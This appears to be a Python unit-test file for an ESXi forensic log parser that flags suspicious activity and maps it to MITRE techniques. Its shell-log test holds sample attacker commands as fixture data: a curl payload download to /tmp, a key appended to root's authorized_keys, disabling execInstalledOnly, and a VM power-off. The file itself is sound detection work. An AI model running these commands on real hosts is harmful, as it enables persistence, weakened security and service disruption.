from __future__ import annotations

import gzip
import json
import tarfile
import tempfile
import unittest
from pathlib import Path

from uac_parser.loaders.uac_layout import discover_sources
from uac_parser.parsers.esxi import parse
from uac_parser.pipeline import run_pipeline


class EsxiParserTests(unittest.TestCase):
    def test_discovers_native_logs_without_generic_duplicates(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            log_dir = root / "esx-lab-01-2026-09-24--03.06-123" / "var/run/log"
            log_dir.mkdir(parents=True)
            (log_dir / "auth.log").write_text("", encoding="utf-8")
            with gzip.open(
                log_dir / "shell.log.1.gz", "wt", encoding="utf-8"
            ) as handle:
                handle.write("")
            (log_dir / "hostd.log").write_text("", encoding="utf-8")

            sources = discover_sources(root)

        types = [source.source_type for source in sources]
        self.assertEqual(
            sorted(types),
            ["esxi_auth_log", "esxi_hostd_log", "esxi_shell_log"],
        )
        self.assertNotIn("auth_log", types)
        self.assertNotIn("syslog", types)

    def test_parses_rotated_authentication_and_infers_bundle_host(self) -> None:
        records = (
            "2026-09-24T01:00:00.123Z sshd[10]: Failed password for invalid user admin "
            "from 198.51.100.20 port 50100 ssh2\n"
            "2026-09-24T01:01:00.456Z sshd[11]: Accepted publickey for root "
            "from 198.51.100.20 port 50101 ssh2\n"
        )
        relative = "esx-lab-01-2026-09-24--03.06-123/var/run/log/auth.0.gz"
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "auth.0.gz"
            with gzip.open(path, "wt", encoding="utf-8") as handle:
                handle.write(records)
            events = parse(path, relative)

        self.assertEqual(
            [event.event_action for event in events],
            ["ssh_login_failure", "ssh_login_success"],
        )
        self.assertTrue(all(event.host == "lab-01" for event in events))
        self.assertEqual(events[1].src_ip, "198.51.100.20")
        self.assertEqual(events[1].timestamp, "2026-09-24T01:01:00.456000Z")

    def test_shell_parser_adds_esxi_specific_detections(self) -> None:
        records = [
            "2026-09-24T02:00:00.000Z In(14) shell[20]: [root]: curl -fsSL "
            "https://updates.example.invalid/agent -o /tmp/agent",
            "2026-09-24T02:01:00.000Z In(14) shell[20]: [root]: echo key >> "
            "/etc/ssh/keys-root/authorized_keys",
            "2026-09-24T02:02:00.000Z In(14) shell[20]: [root]: esxcfg-advcfg "
            "-s 0 /User/execInstalledOnly",
            "2026-09-24T02:03:00.000Z In(14) shell[20]: [root]: vim-cmd "
            "vmsvc/power.off 42",
            "2026-09-24T02:04:00.000Z No(13) ESXShell[21]: ESXi Shell enabled",
        ]
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "shell.log"
            path.write_text("\n".join(records), encoding="utf-8")
            events = parse(path, "bundle/var/run/log/shell.log", host="esx-test")

        detections = {
            detection for event in events for detection in event.detection_names
        }
        self.assertEqual(len(events), 5)
        self.assertTrue(
            {
                "esxi_payload_transfer",
                "esxi_ssh_key_modified",
                "esxi_exec_installed_only_disabled",
                "esxi_destructive_vm_operation",
                "esxi_remote_service_enabled",
            }.issubset(detections)
        )
        self.assertEqual(events[0].command, records[0].split(": [root]: ", 1)[1])
        power_off = next(
            event
            for event in events
            if "esxi_destructive_vm_operation" in event.detection_names
        )
        self.assertIn("T1489", power_off.mitre)
        self.assertNotIn("T1486", power_off.mitre)
        self.assertTrue(all(event.raw for event in events))

    def test_parses_management_vob_kernel_ha_update_and_lifecycle_events(self) -> None:
        samples = {
            "hostd.log": (
                "2026-09-24T03:00:00.000Z In(166) Hostd[30]: info [Originator@6876 "
                "sub=Vimsvc opID=abc] Task Completed : "
                "haTask-42-vim.VirtualMachine.powerOff Status success"
            ),
            "vobd.log": (
                "2026-09-24T03:01:00.000Z In(14) vobd[31]: "
                "[esx.audit.net.firewall.config.changed] Firewall configuration has "
                "changed. Operation 'enable' for rule set sshServer succeeded."
            ),
            "vmkernel.log": (
                "2026-09-24T03:02:00Z Wa(180) vmkernel: storage path is dead"
            ),
            "fdm.log": (
                "2026-09-24T03:03:00.000Z info fdm[32] [Originator@6876 "
                "sub=Cluster] host is isolated"
            ),
            "esxupdate.log": (
                "2026-09-24T03:04:00Z In(14) esxupdate[33]: "
                "VIBs Installed: synthetic-driver"
            ),
            "vmksummary.log": (
                "2026-09-24T03:05:00.000Z No(13) bootstop[34]: Host is rebooting"
            ),
        }
        events = []
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for name, content in samples.items():
                path = root / name
                path.write_text(content, encoding="utf-8")
                events.extend(parse(path, f"bundle/var/run/log/{name}"))

        actions = {event.event_action for event in events}
        self.assertTrue(
            {
                "esxi_high_risk_management_operation",
                "esxi_security_configuration_changed",
                "esxi_storage_path_event",
                "esxi_host_isolated",
                "esxi_software_change",
                "esxi_host_rebooting",
            }.issubset(actions)
        )
        firewall = next(
            event
            for event in events
            if "esxi_firewall_changed" in event.detection_names
        )
        self.assertIn("T1562.004", firewall.mitre)

    def test_ignores_routine_hostd_and_storage_registration_chatter(self) -> None:
        samples = {
            "hostd.log": (
                "2026-09-24T03:00:00.000Z In(166) Hostd[30]: "
                "[Originator@6876 sub=Http2ServerSession] Destroying Http2Session"
            ),
            "vobd.log": (
                "2026-09-24T03:01:00.000Z In(14) vobd[31]: "
                "[vob.scsi.scsipath.add] storage path added"
            ),
        }
        events = []
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for name, content in samples.items():
                path = root / name
                path.write_text(content, encoding="utf-8")
                events.extend(parse(path, f"bundle/var/run/log/{name}"))

        self.assertEqual(events, [])

    def test_pipeline_accepts_one_vm_support_tgz(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            bundle_root = root / "esx-demo-01-2026-09-24--03.06-123"
            log_dir = bundle_root / "var/run/log"
            log_dir.mkdir(parents=True)
            (log_dir / "shell.log").write_text(
                "2026-09-24T04:00:00.000Z In(14) shell[40]: [root]: whoami\n"
                "2026-09-24T04:01:00.000Z In(14) shell[40]: [root]: "
                "vim-cmd vmsvc/power.off 42\n",
                encoding="utf-8",
            )
            archive = root / "esx-demo-01-2026-09-24--03.06-123.tgz"
            with tarfile.open(archive, "w:gz") as handle:
                handle.add(bundle_root, arcname=bundle_root.name)

            output = root / "output"
            result = run_pipeline(archive, output)
            timeline = [
                json.loads(line)
                for line in (output / "timeline_full.jsonl").read_text().splitlines()
            ]
            source_index = json.loads((output / "source_index.json").read_text())

        self.assertEqual(result.errors, 0)
        self.assertEqual(result.events, 2)
        self.assertEqual(
            source_index["sources"][0]["parse_coverage"]["lines_examined"], 2
        )
        self.assertEqual(timeline[0]["source_type"], "esxi_shell_log")
        self.assertEqual(timeline[0]["host"], "demo-01")
        power_off = next(
            event
            for event in timeline
            if "esxi_destructive_vm_operation" in event["detection_names"]
        )
        self.assertIn("T1489", power_off["mitre"])
        self.assertNotIn("T1486", power_off["mitre"])


if __name__ == "__main__":
    unittest.main()
